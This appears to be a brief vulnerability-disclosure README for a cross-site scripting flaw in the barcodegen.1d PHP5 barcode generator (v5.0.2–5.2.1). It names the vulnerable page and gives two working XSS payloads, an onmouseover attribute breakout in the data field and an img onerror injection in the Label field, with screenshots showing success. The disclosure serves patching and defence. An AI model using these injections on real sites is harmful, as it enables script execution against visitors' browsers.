# barcodegen.1d-PHP5-v5.0.2-5.2.1-Cross-Site-Scripting

Barcode Generator barcodegen.1d PHP5-v5.0.2~5.2.1

Target：https://[vulnerable site]/barcode/HTML/BCGothercode.php
  
  Once inserted, use [” onmouseover=”alert(‘test’)] in data,
  ![image](https://github.com/wanglingjhen/barcodegen.1d-PHP5-v5.0.2-5.2.1-Cross-Site-Scripting/blob/main/data.png)
  
  
  succeed
  
  ![image](https://github.com/wanglingjhen/barcodegen.1d-php5.v5.2.1-Cross-Site-Scripting/blob/main/data_test.png)
  
  Other field, use ” > < img src=/ onerror=alert(‘test’)> in Label,
  
  ![image](https://github.com/wanglingjhen/barcodegen.1d-php5.v5.2.1-Cross-Site-Scripting/blob/main/label.png)
  
  succeed
  
  ![image](https://github.com/wanglingjhen/barcodegen.1d-php5.v5.2.1-Cross-Site-Scripting/blob/main/label_test.png)
  
  
